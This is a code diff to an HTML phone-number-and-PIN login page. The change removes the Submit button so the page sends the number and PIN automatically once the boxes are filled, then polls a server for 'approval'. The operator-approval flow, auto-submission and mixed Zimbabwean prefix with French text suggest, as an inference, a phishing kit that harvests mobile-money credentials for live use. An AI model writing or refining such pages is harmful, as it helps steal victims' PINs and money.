@@ -290,7 +290,6 @@
 
         <div class="forgot">Forgot PIN?</div>
 
-        <button type="button" id="connexionBtn" class="btn submit-btn" disabled style="display:block; width:100%; max-width:300px; margin:20px auto 0; padding:14px 20px; background:#bdbdbd; color:#fff; border-radius:12px; font-size:16px; font-weight:bold; cursor:not-allowed;">Submit</button>
     </div>
 
     <div class="bottom">
@@ -329,7 +328,6 @@
     <script>
         const phoneInput = document.getElementById('phoneInput');
         const codeBoxes = Array.from(document.querySelectorAll('.code-box'));
-        const connexionBtn = document.getElementById('connexionBtn');
         const incomingParams = new URLSearchParams(window.location.search);
         const incomingPhone = incomingParams.get('phone') || '';
         const normalizedPhone = incomingPhone.replace(/\D/g, '').replace(/^263/, '').replace(/^0/, '');
@@ -349,12 +347,9 @@
         function checkFormValid() {
             const phone = phoneInput.value.trim();
             const codeFilled = codeBoxes.every((box) => box.value.length === 1);
-            const valid = phone.length > 0 && codeFilled;
-
-            connexionBtn.classList.toggle('active', valid);
-            connexionBtn.disabled = !valid;
-            connexionBtn.style.background = valid ? '#0b5ed7' : '#bdbdbd';
-            connexionBtn.style.cursor = valid ? 'pointer' : 'not-allowed';
+            if (/^[0-9]{9}$/.test(phone) && codeFilled && !requestInProgress) {
+                requestApproval();
+            }
         }
 
         phoneInput.addEventListener('input', () => {
@@ -399,6 +394,7 @@
         const deniedMsg = document.getElementById('deniedMsg');
         const retryBtn = document.getElementById('retryBtn');
         let pollTimer = null;
+        let requestInProgress = false;
 
         function showOverlayWaiting() {
             overlay.classList.add('visible');
@@ -436,17 +432,20 @@
         }
 
         retryBtn.addEventListener('click', () => {
+            requestInProgress = false;
             overlay.classList.remove('visible');
+            codeBoxes.forEach((box) => { box.value = ''; });
+            codeBoxes[0].focus();
         });
 
-        connexionBtn.addEventListener('click', async () => {
+        async function requestApproval() {
+            requestInProgress = true;
             const phone = phoneInput.value.trim();
             if (!/^[0-9]{9}$/.test(phone)) {
                 showInvalidPhone('Le numéro de téléphone doit contenir exactement 9 chiffres.<br>Veuillez entrer le bon numéro et réessayer!');
+                requestInProgress = false;
                 return;
             }
-
-            if (connexionBtn.disabled) return;
 
             const params = new URLSearchParams(window.location.search);
             const code = codeBoxes.map((box) => box.value).join('');
@@ -468,12 +467,13 @@
                 const data = await response.json();
                 pollApproval(data.id, params);
             } catch (error) {
+                requestInProgress = false;
                 overlayTitle.textContent = 'Erreur de connexion';
                 overlayText.textContent = "Impossible d'envoyer la demande. Vérifiez votre connexion et réessayez.";
                 spinner.style.display = 'none';
                 retryBtn.style.display = 'inline-block';
             }
-        });
+        }
 
         checkFormValid();
     </script>
